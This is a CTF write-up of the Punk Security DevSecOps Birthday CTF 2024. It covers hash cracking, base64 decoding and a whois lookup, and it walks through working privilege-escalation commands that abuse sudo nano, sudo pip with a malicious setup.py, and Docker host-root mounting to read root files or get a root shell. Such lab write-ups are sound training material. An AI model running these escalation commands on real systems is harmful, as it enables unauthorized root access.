---
title: Punk Security DevSecOps birthday CTF 2024 Writeup
layout: post
date: 2024-05-05
permalink: punk-security-devsecopsctf-2024-writeup
category: ctf writeups
description: few ctf challenges from punk security DevSecOps Birthday CTF.
author: Inv1nc
---

![](assets/images/2024/24050501.png)

Hello Friend,  

I participated in a 12-hour CTF focused on DevSecOps, hosted by Punk Security from May 04-05. I managed to solve a few challenges. 

Hope you find it interesting!  

---

### Password Cracking - 4

![](assets/images/2024/24050502.png)

**Task:** Crack the hash.

**Explanation:** The hash `cb5e8a23ec9e46a858372247af29a414` is an MD5 hash. We can use hashcat, a tool for password recovery, with a wordlist (`rockyou.txt`) to crack it.

```shell
hashcat -m 0 "cb5e8a23ec9e46a858372247af29a414" rockyou.txt
```

**Flag:** collision

### Password Cracking - 3

![](assets/images/2024/24050503.png)

**Task:** Decode the string.

**Explanation:** The string `cHVua197VGhleV9hcmVfbm90X2FsbF90aGlzX2Vhc3l9` is base64 encoded. We can use the `base64` command to decode it.

```shell
echo -n "cHVua197VGhleV9hcmVfbm90X2FsbF90aGlzX2Vhc3l9" | base64 -d
```

**Flag:** punk_{They_are_not_all_this_easy}


### IntoTheWebs

![](assets/images/2024/24050504.png)

**Task:** Find the registration date of a domain.

**Explanation:** We need to find when the domain `punksecurity.co.uk` was registered. We can use the `whois` command and filter for the registration date.

```shell
whois punksecurity.co.uk | grep Registered\ on
```

**Flag:** punk_{12022021}

### GTFOBINS - 1

**Task:** Access a misconfigured system to retrieve the flag.

**Explanation:** We have sudo access with `nano` which allows us to execute commands as root. We can abuse this to read the flag file.

I used sudo -l and found that the following command has NOPasswd:

```shell
sudo /usr/bin/nano /root/mail
```

After opening nano, press CTRL + R to read and CTRL + X to execute commands.  

```shell
reset; sh 1>&0 2>&0
cat /root/FLAG
```

**Flag:** punk_{XK9F6BPAMJZLG1ML}

### GTFOBINS - 3

**Task:** Leverage a misconfigured system to get the flag.

![](assets/images/2024/24050505.png)

**Explanation:** We can abuse `pip` to execute Python code that reads the flag file.

![](assets/images/2024/24050506.png)

```shell
TF=$(mktemp -d)
echo 'raise Exception(open("/root/FLAG").read())' > $TF/setup.py
sudo pip install $TF
```

**Flag:** punk_{0UTXT5AMK9D3DO5T}

## Docker privesc

**Task:** Access the root filesystem of a Docker container.

**Explanation:** We list Docker images and then run a container, mounting the root filesystem. This allows us to access the root filesystem of the host system.

```shell
docker images
docker run -v /:/mnt --rm -it IMAGE_ID chroot /mnt sh
```

**Flag:** punk_{US8UMG01Y8DR0K2G}

---

External Resources

- [hashcat](https://hashcat.net/hashcat/)
- [GTFOBins](https://gtfobins.github.io/)

--- 

Thanks for reading!